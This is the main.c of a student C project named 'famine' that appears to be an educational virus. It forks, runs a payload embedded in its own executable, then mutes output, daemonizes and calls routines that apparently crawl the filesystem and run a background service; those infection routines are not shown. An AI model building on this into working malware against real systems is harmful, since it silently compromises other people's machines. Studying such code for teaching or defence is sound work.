/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/02/20 12:30:09 by mbatty            #+#    #+#             */
/*   Updated: 2026/04/18 15:19:11 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/stat.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <stdbool.h>
#include <string.h>
#include <sys/file.h>

int	main(int ac, char **av, char **envp)
{
	(void)ac;
	t_exec_ctx	exec_ctx = {0};

	exec_ctx.av = av;
	exec_ctx.envp = envp;
	readlink("/proc/self/exe", exec_ctx.exec_path, sizeof(exec_ctx.exec_path));

	int	pid = fork();
	if (pid == -1)
		return (0);
	else if (pid != 0)
	{
		uint8_t		*buf;
		uint64_t	size;

		if (extract_payload(exec_ctx.exec_path, &buf, &size) == 0)
			exec_payload(&exec_ctx, buf, size);
		return (0);
	}

	if (mute_outputs() == -1)
		return (0);

	int	whoami = daemonize();
	if (whoami == I_AM_A_MISTAKE)
		return (0);
	else if (whoami == I_AM_MAIN_PROCESS)
		return (crawl(&exec_ctx), 0);
	else if (whoami == I_AM_CHILD_PROCESS)
		return (run_service(), 0);
	return (0);
}
